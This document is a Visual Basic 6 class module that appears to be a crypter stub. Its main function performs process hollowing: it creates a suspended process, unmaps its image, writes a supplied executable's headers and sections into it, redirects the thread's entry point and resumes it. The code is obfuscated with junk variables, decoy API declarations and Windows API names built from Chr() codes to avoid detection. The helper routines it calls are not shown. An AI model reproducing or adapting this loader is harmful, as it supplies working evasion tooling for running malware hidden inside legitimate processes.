VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "bbnq"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Private Const sConst001       As Long = &H5A4D&
Private Const sConst002        As Long = &H4550&
Private Const sConst003           As Long = &H40
Private Const sConst004           As Long = &HF8
Private Const sConst005     As Long = &H28
Private Const sConst006 As Long = &H28
Private Const sConst011              As Long = &H10007
Private Const sConst012          As Long = &H4
Private Const sConst013                As Long = &H1000
Private Const sConst014               As Long = &H2000
Private Const sConst015    As Long = &H40
Private Type sType001
cb                          As Long
lpReserved                  As Long
lpDesktop                   As Long
lpTitle                     As Long
dwX                         As Long
dwY                         As Long
dwXSize                     As Long
dwYSize                     As Long
dwXCountChars               As Long
dwYCountChars               As Long
dwFillAttribute             As Long
dwFlags                     As Long
wShowWindow                 As Integer
cbReserved2                 As Integer
lpReserved2                 As Long
hStdInput                   As Long
hStdOutput                  As Long
hStdError                   As Long
End Type
Private Type sType002
hProcess                    As Long
hThread                     As Long
dwProcessID                 As Long
dwThreadID                  As Long
End Type
Private Type sType003
ControlWord                 As Long
StatusWord                  As Long
TagWord                     As Long
ErrorOffset                 As Long
ErrorSelector               As Long
DataOffset                  As Long
DataSelector                As Long
RegisterArea(1 To 80)       As Byte
Cr0NpxState                 As Long
End Type
Private Type sType004
ContextFlags                As Long
Dr0                         As Long
Dr1                         As Long
Dr2                         As Long
Dr3                         As Long
Dr6                         As Long
Dr7                         As Long
FloatSave                   As sType003
SegGs                       As Long
SegFs                       As Long
SegEs                       As Long
SegDs                       As Long
Edi                         As Long
Esi                         As Long
Ebx                         As Long
Edx                         As Long
Ecx                         As Long
Eax                         As Long
Ebp                         As Long
Eip                         As Long
SegCs                       As Long
EFlags                      As Long
Esp                         As Long
SegSs                       As Long
End Type
Private Type sType005
e_magic                     As Integer
e_cblp                      As Integer
e_cp                        As Integer
e_crlc                      As Integer
e_cparhdr                   As Integer
e_minalloc                  As Integer
e_maxalloc                  As Integer
e_ss                        As Integer
e_sp                        As Integer
e_csum                      As Integer
e_ip                        As Integer
e_cs                        As Integer
e_lfarlc                    As Integer
e_ovno                      As Integer
e_res(0 To 3)               As Integer
e_oemid                     As Integer
e_oeminfo                   As Integer
e_res2(0 To 9)              As Integer
e_lfanew                    As Long
End Type
Private Type sType006
Machine                     As Integer
NumberOfSections            As Integer
TimeDateStamp               As Long
PointerToSymbolTable        As Long
NumberOfSymbols             As Long
SizeOfOptionalHeader        As Integer
Characteristics             As Integer
End Type
Private Type sType007
VirtualAddress              As Long
Size                        As Long
End Type
Private Type sType008
Magic                       As Integer
MajorLinkerVersion          As Byte
MinorLinkerVersion          As Byte
SizeOfCode                  As Long
SizeOfsFunction09Data       As Long
SizeOfUnitializedData       As Long
AddressOfEntryPoint         As Long
BaseOfCode                  As Long
BaseOfData                  As Long
ImageBase                   As Long
SectionAlignment            As Long
FileAlignment               As Long
MajorOperatingSystemVersion As Integer
MinorOperatingSystemVersion As Integer
MajorImageVersion           As Integer
MinorImageVersion           As Integer
MajorSubsystemVersion       As Integer
MinorSubsystemVersion       As Integer
W32VersionValue             As Long
SizeOfImage                 As Long
SizeOfHeaders               As Long
CheckSum                    As Long
SubSystem                   As Integer
DllCharacteristics          As Integer
SizeOfStackReserve          As Long
SizeOfStackCommit           As Long
SizeOfHeapReserve           As Long
SizeOfHeapCommit            As Long
LoaderFlags                 As Long
NumberOfRvaAndSizes         As Long
DataDirectory(0 To 15)      As sType007
End Type
Private Type sType009
Signature                   As Long
FileHeader                  As sType006
OptionalHeader              As sType008
End Type
Private Type sType010
Characteristics              As Long
TimeDateStamp                As Long
MajorVersion                 As Integer
MinorVersion                 As Integer
lpName                       As Long
Base                         As Long
NumberOfFunctions            As Long
NumberOfNames                As Long
lpAddressOfFunctions         As Long
lpAddressOfNames             As Long
lpAddressOfNameOrdinals      As Long
End Type
Private Type sType011
SecName                     As String * 8
VirtualSize                 As Long
VirtualAddress              As Long
SizeOfRawData               As Long
PointerToRawData            As Long
PointerToRelocations        As Long
PointerToLinenumbers        As Long
NumberOfRelocations         As Integer
NumberOfLinenumbers         As Integer
Characteristics             As Long
End Type
Private Declare Function bemqldbbacsvcjuufacujvmld Lib "winmm.dll" (ByVal hWaveIn As Long) As Long
Private Declare Function aiakrgraufuibgigltdghlvsj Lib "gdi32" (ByVal hdc As Long, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function lchhoprncifunoamoutlrggrv Lib "gdi32" (ByVal hdc As Long, ByVal ArcDirection As Long) As Long
Private Declare Function StringFrombnogjruqhfffhadgndcjfgcn2 Lib "OLE32.DLL" (pbnogjruqhfffhadgndcjfgcn As bnogjruqhfffhadgndcjfgcn, ByVal PointerToString As Long, ByVal MaxLength As Long) As Long
Private Declare Function kvrqvgmvquigstltvdumqqprf Lib "winmm.dll" (ByVal hWaveOut As Long) As Long
Private Declare Function ghpfhnsekfvkutjbjdfqfjhpn Lib "gdi32" (ByVal hdc As Long, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function fmugpmivddceurulrqbdealro Lib "gdi32" (ByVal hemf As Long, ByVal cbBuffer As Long, lpbBuffer As Byte) As Long
Private Declare Function hmslsmodutqcaktikjopvijnr Lib "gdi32" (ByVal hdc As Long, ByVal hRgn As Long, ByVal fnMode As Long) As Long
Private Declare Function nknepjqstpeqhavqcuqafttoi Lib "gdi32" (ByVal hdc As Long) As Long
Private Declare Function qdsbdchoobcgqiuftvilhussr Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal crColor As Long) As Long
Private Declare Function qpidmiekohgbbnqalulvhmhgd Lib "gdi32" (ByVal hdc As Long, ByVal crColor As Long) As Long
Private Declare Sub e4j8c5PCdAMaIZLPodaU Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal dlen As Long)
Private Type bnogjruqhfffhadgndcjfgcn
Guid1 As Long
Guid2 As Long
Guid3 As Long
Guid4(0 To 7) As Byte
End Type
Private Declare Function dvfjccttimrhphrchcbvgfpin Lib "winmm.dll" (ByVal uDeviceID As Long, ByVal dwVolume As Long) As Long
Private Declare Function nsdenosgukriltbskiihjdadq Lib "gdi32" (ByVal hdc As Long, ByVal nIndex As Long) As Long
Private Declare Function vghjfqgtmkfokgmqjjeujtcia Lib "gdi32" (ByVal hdc As Long, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long, ByVal X3 As Long, ByVal Y3 As Long) As Long
Private Declare Function ijupomtsgpdgejkreeinkbhpc Lib "gdi32" (ByVal hdc As Long, ByVal eNewLimit As Double, peOldLimit As Double) As Long
Private Declare Function idruvuaqnqhmmtuvsgnkdrsfr Lib "gdi32" (ByVal hdc As Long) As Long
Private Declare Function dhqaqlakjvnuoqfqvsednakhf Lib "gdi32" (ByVal hdc As Long) As Long
Private Declare Function rclgkurijajlpkcfgfhrubott Lib "gdi32" (ByVal hdc As Long) As Long
Private Declare Function fhdourkdemcekjbhsshlqgpgq Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long) As Long
Private Declare Function ncgemeohmonsdjmnrfdpqiksa Lib "gdi32" (ByVal hdc As Long, ByVal hRgn As Long, ByVal hBrush As Long, ByVal nWidth As Long, ByVal nHeight As Long) As Long
Private Declare Function jhhgicfipeelhiepfsrkfnjfl Lib "gdi32" (ByVal hdc As Long) As Long
Private Declare Function iiddosbnanbjojifnlvotvuck Lib "gdi32" (ByVal cbBuffer As Long, lpData As Byte) As Long
Private Declare Function tucmeqbprdhcqoonpjgjalfmo Lib "gdi32" (ByVal hdc As Long) As Long
Private Declare Function rgsjcareascgvvqkvjoumuope Lib "gdi32" (ByVal hdc As Long) As Long
Private inject_var001         As Long
Private inject_var002      As Long
Private inject_var003         As Boolean
Private inject_var004          As Long
Private inject_var005       As Long
Private inject_var006(&HFF)   As Byte
Public Function fmnolvgdskl() As Long
Dim melfhsnmjrqe98 As String
melfhsnmjrqe98 = ""
Dim bluifdipajd21 As String
bluifdipajd21 = ""
Dim annfiqtpgef58 As String
annfiqtpgef58 = ""
Dim spdpgaupcuqaettnh63 As String
spdpgaupcuqaettnh63 = ""
Dim rcsujudaihq49 As String
rcsujudaihq49 = ""
Dim qquigstloadvmkk98 As String
qquigstloadvmkk98 = ""
Dim pgaupcuqaet22 As String
pgaupcuqaet22 = ""
Dim qgiomfkvvlouk26 As String
qgiomfkvvlouk26 = ""
Dim tqukqqacdak1 As String
tqukqqacdak1 = ""
End Function
Public Function lbdjobgbrhq(ByRef werigwiw() As Byte, Optional wg8ihrd As String) As Boolean
Dim irnjptmmggsvfrdq62 As String
irnjptmmggsvfrdq62 = ""
Dim ctspbajthkinouii92 As String
ctspbajthkinouii92 = ""
Dim liqpcsadbgnnbbf67 As String
liqpcsadbgnnbbf67 = ""
Dim svhkgtrrrtmk49 As String
svhkgtrrrtmk49 = ""
Dim qukqqacdakrnhvajvbh91 As String
qukqqacdakrnhvajvbh91 = ""
Dim sihoklisivvnirn62 As String
sihoklisivvnirn62 = ""
Dim eomcdrugjf49 As String
eomcdrugjf49 = ""
On Error Resume Next
Dim vovbcujvmgevie12 As String
vovbcujvmgevie12 = ""
Dim fhmrejeukttjbice10 As String
fhmrejeukttjbice10 = ""
Dim qnvobqvbafmsvae97 As String
qnvobqvbafmsvae97 = ""
Dim bbbdspsjvov73 As String
bbbdspsjvov73 = ""
Dim pfhmrejeuktt12 As String
pfhmrejeuktt12 = ""
Dim i                       As Long
Dim dlalqnvobqvbafmsv60 As String
dlalqnvobqvbafmsv60 = ""
Dim cfnqmdbbbdspsj19 As String
cfnqmdbbbdspsj19 = ""
Dim fgpfhmrejeukttj57 As String
fgpfhmrejeukttj57 = ""
Dim pcpdlalqnvo78 As String
pcpdlalqnvo78 = ""
Dim gpdnpotuenosa22 As String
gpdnpotuenosa22 = ""
Dim tIMAGE_DOS_HEADER       As sType005
Dim orconuqrncofeto65 As String
orconuqrncofeto65 = ""
Dim nfgpfhmrejeukttjbi82 As String
nfgpfhmrejeukttjbi82 = ""
Dim aknqhmmtvashnkdstfr33 As String
aknqhmmtvashnkdstfr33 = ""
Dim bbsshlqgpgqchc81 As String
bbsshlqgpgqchc81 = ""
Dim ucgeqbjrdbtkoonpjg40 As String
ucgeqbjrdbtkoonpjg40 = ""
Dim tIMAGE_NT_HEADERS       As sType009
Dim ashnkdstfrtdcqallbe64 As String
ashnkdstfrtdcqallbe64 = ""
Dim ugfohmonsd7 As String
ugfohmonsd7 = ""
Dim tucgeqbjrdbtko13 As String
tucgeqbjrdbtko13 = ""
Dim shnkdstfrt99 As String
shnkdstfrt99 = ""
Dim tIMAGE_SECTION_HEADER   As sType011
Dim lkdugcuejbbsshlqgpg43 As String
lkdugcuejbbsshlqgpg43 = ""
Dim tvashnkdstfrtdc91 As String
tvashnkdstfrtdc91 = ""
Dim qgpgqchcbugfohm37 As String
qgpgqchcbugfohm37 = ""
Dim udektucgeqbjrdbtkoo100 As String
udektucgeqbjrdbtkoo100 = ""
Dim mmtvashnkdstf68 As String
mmtvashnkdstf68 = ""
Dim gcuejbbsshlqgpgqchc81 As String
gcuejbbsshlqgpgqchc81 = ""
Dim hnfnhjuonlt27 As String
hnfnhjuonlt27 = ""
Dim tSTARTUPINFO            As sType001
Dim fjrbkfjtrhiai73 As String
fjrbkfjtrhiai73 = ""
Dim kfhdoerqiem78 As String
kfhdoerqiem78 = ""
Dim chnfnhjuonltrfod87 As String
chnfnhjuonltrfod87 = ""
Dim fjtrhiaikojbff51 As String
fjtrhiaikojbff51 = ""
Dim fhbehoddkfhd72 As String
fhbehoddkfhd72 = ""
Dim raoojdochnfnhju76 As String
raoojdochnfnhju76 = ""
Dim igemkunsusbjjst4 As String
igemkunsusbjjst4 = ""
Dim tPROCESS_INFORMATION    As sType002
Dim albfdkdnglnmqcir82 As String
albfdkdnglnmqcir82 = ""
Dim vgtaimhvttsuol11 As String
vgtaimhvttsuol11 = ""
Dim eblspiabkac70 As String
eblspiabkac70 = ""
Dim mqvltlvgrg52 As String
mqvltlvgrg52 = ""
Dim tCONTEXT                As sType004
Dim dhrjvgtaimh81 As String
dhrjvgtaimh81 = ""
Dim dedfvsvmrr72 As String
dedfvsvmrr72 = ""
Dim upjuintltnodutrcblu18 As String
upjuintltnodutrcblu18 = ""
Dim mvfaqfpoeseuv32 As String
mvfaqfpoeseuv32 = ""
Dim adbgnubbfpneesvhlg12 As String
adbgnubbfpneesvhlg12 = ""
Dim lKernel                 As Long
Dim qbcdakbohf62 As String
qbcdakbohf62 = ""
Dim vukcjdfqfkhpocl69 As String
vukcjdfqfkhpocl69 = ""
Dim hlgtrsrtnqteppvrspd84 As String
hlgtrsrtnqteppvrspd84 = ""
Dim hfajfbhleeupeotd9 As String
hfajfbhleeupeotd9 = ""
Dim dfqfkhpoclvsqv12 As String
dfqfkhpoclvsqv12 = ""
Dim eotdrctujedbihre58 As String
eotdrctujedbihre58 = ""
Dim naquigtuluaev1 As String
naquigtuluaev1 = ""
Dim lNTDll                  As Long
Dim teppvrspdqhgupcuq90 As String
teppvrspdqhgupcuq90 = ""
Dim eupeotdrctuj57 As String
eupeotdrctuj57 = ""
Dim clasrahnarvjhtum34 As String
clasrahnarvjhtum34 = ""
Dim vhlgussrtnqteppast54 As String
vhlgussrtnqteppast54 = ""
Dim ohfbjfbhme16 As String
ohfbjfbhme16 = ""
Dim egrgkiqoclasra2 As String
egrgkiqoclasra2 = ""
Dim bcgqoeftvhlgussrtnq73 As String
bcgqoeftvhlgussrtnq73 = ""
Dim lMod                    As Long
Dim rulaqbdealbohfbjfbh74 As String
rulaqbdealbohfbjfbh74 = ""
If Not inject_var003 Then Exit Function
Dim bjfbhmeevpeo97 As String
bjfbhmeevpeo97 = ""
Dim vukckegrgkiqocl59 As String
vukckegrgkiqocl59 = ""
Dim lgussrtnqtepp24 As String
lgussrtnqtepp24 = ""
Dim ikgrhunlgplhn15 As String
ikgrhunlgplhn15 = ""
Dim qiqklalqovui83 As String
qiqklalqovui83 = ""
Call e4j8c5PCdAMaIZLPodaU(tIMAGE_DOS_HEADER, werigwiw(0), sConst003)
Dim muehimatklcfn2 As String
muehimatklcfn2 = ""
Dim rgahikgrhunl93 As String
rgahikgrhunl93 = ""
If Not tIMAGE_DOS_HEADER.e_magic = sConst001 Then
Dim clrmgrfeqiqklalqovu2 As String
clrmgrfeqiqklalqovu2 = ""
Dim ergahikgrh34 As String
ergahikgrh34 = ""
Dim mouclrmgrf48 As String
mouclrmgrf48 = ""
Dim shsbvgvjchjhmue98 As String
shsbvgvjchjhmue98 = ""
Exit Function
Dim amouclrmgrfeqiqk82 As String
amouclrmgrfeqiqk82 = ""
End If
Dim grcnchemfpimpnsdk39 As String
grcnchemfpimpnsdk39 = ""
Dim mercpseidqo96 As String
mercpseidqo96 = ""
Dim holestgsueirbrmblk47 As String
holestgsueirbrmblk47 = ""
Dim fpimpnsdknnrfdq10 As String
fpimpnsdknnrfdq10 = ""
Dim rcpseidqopoq7 As String
rcpseidqopoq7 = ""
Dim jqffmhifpgts96 As String
jqffmhifpgts96 = ""
Dim dnurkcdmcekob7 As String
dnurkcdmcekob7 = ""
Dim pioccosbnvmaitink58 As String
pioccosbnvmaitink58 = ""
Dim eiskbhvcknj34 As String
eiskbhvcknj34 = ""
Dim bnttdfgdnurkcdmceko56 As String
bnttdfgdnurkcdmceko56 = ""
Dim slvosvtcjpttbl18 As String
slvosvtcjpttbl18 = ""
Dim auvuaqnqgsmsuv86 As String
auvuaqnqgsmsuv86 = ""
Call e4j8c5PCdAMaIZLPodaU(tIMAGE_NT_HEADERS, werigwiw(tIMAGE_DOS_HEADER.e_lfanew), sConst004)
Dim kslvosvtcjpttblj21 As String
kslvosvtcjpttblj21 = ""
Dim knjauvuaqnq100 As String
knjauvuaqnq100 = ""
Dim tdfgdnurkcdmcekobh71 As String
tdfgdnurkcdmcekobh71 = ""
If Not tIMAGE_NT_HEADERS.Signature = sConst002 Then
Dim qcreucfdipvddhrpfg63 As String
qcreucfdipvddhrpfg63 = ""
Exit Function
End If
Dim cqhnfiqtpgeeegvs5 As String
cqhnfiqtpgeeegvs5 = ""
Dim jlmitdaqijs33 As String
jlmitdaqijs33 = ""
Dim avotiiubhtfsgodot60 As String
avotiiubhtfsgodot60 = ""
lKernel = maukldmorne(Chr(107) & Chr(101) & Chr(114) & Chr(110) & Chr(101) & Chr(108) & Chr(51) & Chr(50))
Dim mkpaakkocqhnfi87 As String
mkpaakkocqhnfi87 = ""
Dim mitdaqijsikquhm11 As String
mitdaqijsikquhm11 = ""
Dim sgodotqcreuc1 As String
sgodotqcreuc1 = ""
Dim eeegvsvmcscef27 As String
eeegvsvmcscef27 = ""
lNTDll = maukldmorne(Chr(110) & Chr(116) & Chr(100) & Chr(108) & Chr(108))
Dim ensnhtggrkrlncnspba65 As String
ensnhtggrkrlncnspba65 = ""
Dim vfijnbvlmehpsofd8 As String
vfijnbvlmehpsofd8 = ""
Dim sibiklhsivpn56 As String
sibiklhsivpn56 = ""
Dim krlncnspbajshdchou51 As String
krlncnspbajshdchou51 = ""
Dim jovfijnbvlmehp65 As String
jovfijnbvlmehp65 = ""
If wg8ihrd = vbNullString Then
Dim fcfsibiklhsivpn56 As String
fcfsibiklhsivpn56 = ""
Dim udooehnclcmu76 As String
udooehnclcmu76 = ""
Dim jirkprqvgg30 As String
jirkprqvgg30 = ""
wg8ihrd = Space(260)
lMod = vvvbknqhnmt(lKernel, Chr(71) & Chr(101) & Chr(116) & Chr(77) & Chr(111) & Chr(100) & Chr(117) & Chr(108) & Chr(101) & Chr(70) & Chr(105) & Chr(108) & Chr(101) & Chr(78) & Chr(97) & Chr(109) & Chr(101) & Chr(87))
cognhjujolt lMod, App.hInstance, StrPtr(wg8ihrd), 260
End If
Dim sjoovbcujpmfuvhtv45 As String
sjoovbcujpmfuvhtv45 = ""
Dim igogqjoqpuf53 As String
igogqjoqpuf53 = ""
With tIMAGE_NT_HEADERS.OptionalHeader
Dim rtfjesqqprl12 As String
rtfjesqqprl12 = ""
Dim opthfrskmuctljj36 As String
opthfrskmuctljj36 = ""
Dim rlilcnhoqrncofuto72 As String
rlilcnhoqrncofuto72 = ""
Dim ncmlbpbrtitbvhfpcn13 As String
ncmlbpbrtitbvhfpcn13 = ""
Dim ruvdnlbcqseidrp89 As String
ruvdnlbcqseidrp89 = ""
Dim lecugcueibbsmblqaoa9 As String
lecugcueibbsmblqaoa9 = ""
Dim osektosgeqrjrtbsk55 As String
osektosgeqrjrtbsk55 = ""
tSTARTUPINFO.cb = Len(tSTARTUPINFO)
Dim qmbnedrnvrntcqql4 As String
qmbnedrnvrntcqql4 = ""
Dim epvsldendflpc70 As String
epvsldendflpc70 = ""
Dim lukmsrjpeeptco4 As String
lukmsrjpeeptco4 = ""
Dim pkcaavbroritnuv12 As String
pkcaavbroritnuv12 = ""
Dim ndflpcidtisr50 As String
ndflpcidtisr50 = ""
Dim bjclejlkpag33 As String
bjclejlkpag33 = ""
Dim bnumobeanllkng43 As String
bnumobeanllkng43 = ""
Dim khapqdprafot24 As String
khapqdprafot24 = ""
lMod = vvvbknqhnmt(lKernel, Chr(67) & Chr(114) & Chr(101) & Chr(97) & Chr(116) & Chr(101) & Chr(80) & Chr(114) & Chr(111) & Chr(99) & Chr(101) & Chr(115) & Chr(115) & Chr(87))
cognhjujolt lMod, 0, StrPtr(wg8ihrd), 0, 0, 0, sConst012, 0, 0, VarPtr(tSTARTUPINFO), VarPtr(tPROCESS_INFORMATION)
Dim eppfiodmdnvkvebjcle44 As String
eppfiodmdnvkvebjcle44 = ""
Dim sugkftrrqsm84 As String
sugkftrrqsm84 = ""
Dim ngvaiuagltduoenmc26 As String
ngvaiuagltduoenmc26 = ""
Dim otjsjtfqfjhphr28 As String
otjsjtfqfjhphr28 = ""
Dim kqngvaiuagltduoenmc26 As String
kqngvaiuagltduoenmc26 = ""
Dim qoeltfnlhuccbdt94 As String
qoeltfnlhuccbdt94 = ""
Dim eraahikgrb89 As String
eraahikgrb89 = ""
Dim mbfkaiakrbrqoau98 As String
mbfkaiakrbrqoau98 = ""
Dim fpcnpnsuenosa32 As String
fpcnpnsuenosa32 = ""
lMod = vvvbknqhnmt(lNTDll, Chr(78) & Chr(116) & Chr(85) & Chr(110) & Chr(109) & Chr(97) & Chr(112) & Chr(86) & Chr(105) & Chr(101) & Chr(119) & Chr(79) & Chr(102) & Chr(83) & Chr(101) & Chr(99) & Chr(116) & Chr(105) & Chr(111) & Chr(110))
Dim hkbggnoqmbhe84 As String
hkbggnoqmbhe84 = ""
Dim cofesoasoudrrmmb23 As String
cofesoasoudrrmmb23 = ""
Dim cbvhfpcnpnsue94 As String
cbvhfpcnpnsue94 = ""
Dim ntskqffqudpbpdk30 As String
ntskqffqudpbpdk30 = ""
Dim njflpiictisb93 As String
njflpiictisb93 = ""
cognhjujolt lMod, tPROCESS_INFORMATION.hProcess, .ImageBase
Dim pdaudkrevdnk87 As String
pdaudkrevdnk87 = ""
Dim jadlpkcaavbru70 As String
jadlpkcaavbru70 = ""
Dim gheofsljenjf88 As String
gheofsljenjf88 = ""
Dim jujomtsgpdaud99 As String
jujomtsgpdaud99 = ""
Dim rcdmnrfsjqhksar9 As String
rcdmnrfsjqhksar9 = ""
Dim bsknonpjgja79 As String
bsknonpjgja79 = ""
Dim jbclbdjhagqqgkpfn25 As String
jbclbdjhagqqgkpfn25 = ""
Dim gdlkunrusbijs61 As String
gdlkunrusbijs61 = ""
Dim bjhcptutvpmpglls74 As String
bjhcptutvpmpglls74 = ""
lMod = vvvbknqhnmt(lKernel, Chr(86) & Chr(105) & Chr(114) & Chr(116) & Chr(117) & Chr(97) & Chr(108) & Chr(65) & Chr(108) & Chr(108) & Chr(111) & Chr(99) & Chr(69) & Chr(120))
Dim mhgdlkunrusbi58 As String
mhgdlkunrusbi58 = ""
Dim ptutvpmpgll41 As String
ptutvpmpgll41 = ""
Dim phirhjpngmaampvltku89 As String
phirhjpngmaampvltku89 = ""
Dim ccgqivftailhusss19 As String
ccgqivftailhusss19 = ""
cognhjujolt lMod, tPROCESS_INFORMATION.hProcess, .ImageBase, .SizeOfImage, sConst013 Or sConst014, sConst015
Dim lsoiabkaci63 As String
lsoiabkaci63 = ""
lMod = vvvbknqhnmt(lKernel, Chr(87) & Chr(114) & Chr(105) & Chr(116) & Chr(101) & Chr(80) & Chr(114) & Chr(111) & Chr(99) & Chr(101) & Chr(115) & Chr(115) & Chr(77) & Chr(101) & Chr(109) & Chr(111) & Chr(114) & Chr(121))
Dim rgliqjtmqtra91 As String
rgliqjtmqtra91 = ""
Dim deblsoiabk49 As String
deblsoiabk49 = ""
Dim putmrggsvfrdqem92 As String
putmrggsvfrdqem92 = ""
cognhjujolt lMod, tPROCESS_INFORMATION.hProcess, .ImageBase, VarPtr(werigwiw(0)), .SizeOfHeaders, 0
Dim nuuhimaoeldgo91 As String
nuuhimaoeldgo91 = ""
Dim rbahjkgrbuog41 As String
rbahjkgrbuog41 = ""
For i = 0 To tIMAGE_NT_HEADERS.FileHeader.NumberOfSections - 1
Dim tmrggsvfrdqembmroap50 As String
tmrggsvfrdqembmroap50 = ""
Dim ornecccetqtk91 As String
ornecccetqtk91 = ""
Dim hqginsfkfvlu26 As String
hqginsfkfvlu26 = ""
Dim ihmtdghlvtjk61 As String
ihmtdghlvtjk61 = ""
e4j8c5PCdAMaIZLPodaU tIMAGE_SECTION_HEADER, werigwiw(tIMAGE_DOS_HEADER.e_lfanew + sConst004 + sConst006 * i), Len(tIMAGE_SECTION_HEADER)
Dim dadqfvgijfqgtm44 As String
dadqfvgijfqgtm44 = ""
Dim ntclqlfredpipjl23 As String
ntclqlfredpipjl23 = ""
Dim ugvibgihmt69 As String
ugvibgihmt69 = ""
cognhjujolt lMod, tPROCESS_INFORMATION.hProcess, .ImageBase + tIMAGE_SECTION_HEADER.VirtualAddress, VarPtr(werigwiw(tIMAGE_SECTION_HEADER.PointerToRawData)), tIMAGE_SECTION_HEADER.SizeOfRawData, 0
Dim jgomajuavefluv45 As String
jgomajuavefluv45 = ""
Next i
Dim lftuhtvfdscmmcfl26 As String
lftuhtvfdscmmcfl26 = ""
Dim hgqjnqotefoosgulrjm75 As String
hgqjnqotefoosgulrjm75 = ""
Dim scktfculpppr86 As String
scktfculpppr86 = ""
Dim cmosioouab35 As String
cmosioouab35 = ""
Dim janmevieagkddttjmsi80 As String
janmevieagkddttjmsi80 = ""
Dim jbicepkjgon2 As String
jbicepkjgon2 = ""
Dim rfcafmsgaeomd69 As String
rfcafmsgaeomd69 = ""
tCONTEXT.ContextFlags = sConst011
Dim fsskfokgmqjjddpsc76 As String
fsskfokgmqjjddpsc76 = ""
Dim qpmutgqegfklrefjnlb99 As String
qpmutgqegfklrefjnlb99 = ""
Dim bouteghdourldendfkj94 As String
bouteghdourldendfkj94 = ""
Dim jddpscoanbjoji57 As String
jddpscoanbjoji57 = ""
Dim fjnlbiqdlier51 As String
fjnlbiqdlier51 = ""
Dim dendfkjchssilrh11 As String
dendfkjchssilrh11 = ""
Dim fejqqdeiska30 As String
fejqqdeiska30 = ""
lMod = vvvbknqhnmt(lNTDll, Chr(78) & Chr(116) & Chr(71) & Chr(101) & Chr(116) & Chr(67) & Chr(111) & Chr(110) & Chr(116) & Chr(101) & Chr(120) & Chr(116) & Chr(84) & Chr(104) & Chr(114) & Chr(101) & Chr(97) & Chr(100))
Dim dfgcntqjcdlcdjobgb72 As String
dfgcntqjcdlcdjobgb72 = ""
Dim dfejqqdeiskahvbknja22 As String
dfejqqdeiskahvbknja22 = ""
Dim gcntqjcdlcdj16 As String
gcntqjcdlcdj16 = ""
Dim sgocosqcqetc11 As String
sgocosqcqetc11 = ""
cognhjujolt lMod, tPROCESS_INFORMATION.hThread, VarPtr(tCONTEXT)
Dim cqgnfhptogeedfvs15 As String
cqgnfhptogeedfvs15 = ""
Dim apijrhjpugm21 As String
apijrhjpugm21 = ""
Dim rjtejedbjhrkpr12 As String
rjtejedbjhrkpr12 = ""
lMod = vvvbknqhnmt(lKernel, Chr(87) & Chr(114) & Chr(105) & Chr(116) & Chr(101) & Chr(80) & Chr(114) & Chr(111) & Chr(99) & Chr(101) & Chr(115) & Chr(115) & Chr(77) & Chr(101) & Chr(109) & Chr(111) & Chr(114) & Chr(121))
Dim abfjhtemugevnrrq63 As String
abfjhtemugevnrrq63 = ""
Dim bcvkqnguvi93 As String
bcvkqnguvi93 = ""
cognhjujolt lMod, tPROCESS_INFORMATION.hProcess, tCONTEXT.Ebx + 8, VarPtr(.ImageBase), 4, 0
Dim bjfbhleevvko100 As String
bjfbhleevvko100 = ""
Dim bparshsbvgfpcmj33 As String
bparshsbvgfpcmj33 = ""
Dim ooshersjmuctlij45 As String
ooshersjmuctlij45 = ""
Dim pqnbofusnasoucrr92 As String
pqnbofusnasoucrr92 = ""
Dim fpcmjhmtenima39 As String
fpcmjhmtenima39 = ""
Dim ikehkrggnijgqh36 As String
ikehkrggnijgqh36 = ""
Dim rlbkqaovpr47 As String
rlbkqaovpr47 = ""
Dim irrhvgacnchemluisp73 As String
irrhvgacnchemluisp73 = ""
Dim ehdqopoqkmqbmmsopm38 As String
ehdqopoqkmqbmmsopm38 = ""
tCONTEXT.Eax = .ImageBase + .AddressOfEntryPoint
Dim brlbkqaovp25 As String
brlbkqaovp25 = ""
lMod = vvvbknqhnmt(lNTDll, Chr(78) & Chr(116) & Chr(83) & Chr(101) & Chr(116) & Chr(67) & Chr(111) & Chr(110) & Chr(116) & Chr(101) & Chr(120) & Chr(116) & Chr(84) & Chr(104) & Chr(114) & Chr(101) & Chr(97) & Chr(100))
Dim ksreocvtcjpctblj24 As String
ksreocvtcjpctblj24 = ""
Dim uuuapsvgsr58 As String
uuuapsvgsr58 = ""
Dim qkidmiekohh73 As String
qkidmiekohh73 = ""
Dim vinicobbnfmgitink61 As String
vinicobbnfmgitink61 = ""
Dim qaeeisqghvcknj37 As String
qaeeisqghvcknj37 = ""
Dim rqsmjmdoipqrocpgv10 As String
rqsmjmdoipqrocpgv10 = ""
Dim uviuagktdtod72 As String
uviuagktdtod72 = ""
cognhjujolt lMod, tPROCESS_INFORMATION.hThread, VarPtr(tCONTEXT)
Dim ejgohrkorpufmpqui21 As String
ejgohrkorpufmpqui21 = ""
Dim fsqrqsmjmdoipq53 As String
fsqrqsmjmdoipq53 = ""
Dim qnguviuagktdto92 As String
qnguviuagktdto92 = ""
Dim nbqubvelsvvdnlccqtf28 As String
nbqubvelsvvdnlccqtf28 = ""
Dim cabacspsjuovabu20 As String
cabacspsjuovabu20 = ""
Dim unbqubvelsvvdnl66 As String
unbqubvelsvvdnl66 = ""
Dim emplcabacs34 As String
emplcabacs34 = ""
lMod = vvvbknqhnmt(lNTDll, Chr(78) & Chr(116) & Chr(82) & Chr(101) & Chr(115) & Chr(117) & Chr(109) & Chr(101) & Chr(84) & Chr(104) & Chr(114) & Chr(101) & Chr(97) & Chr(100))
Dim vfelnolvgcsklu77 As String
vfelnolvgcsklu77 = ""
Dim bqvkkadjvhu52 As String
bqvkkadjvhu52 = ""
Dim batfenhlomrc27 As String
batfenhlomrc27 = ""
cognhjujolt lMod, tPROCESS_INFORMATION.hThread, 0
Dim tbfdqairdasjnnnpif59 As String
tbfdqairdasjnnnpif59 = ""
